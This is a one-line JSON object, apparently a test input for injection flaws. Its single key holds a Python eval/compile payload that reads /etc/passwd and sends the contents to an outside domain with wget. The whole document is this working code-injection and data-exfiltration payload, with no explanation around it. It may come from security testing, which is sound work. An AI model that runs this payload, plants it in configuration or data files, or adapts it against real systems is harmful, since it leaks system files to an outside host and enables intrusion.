```
{"VULNERABLEKEY":"eval(compile('for x in range(1):\\n import urllib\\n import os\\n os.system(\\'wget https://www.aswsec.com/?passwd-\\' +urllib.parse.quote_plus(os.popen(\\'cat /etc/passwd\\').read() ) )','a','single'))"}
```
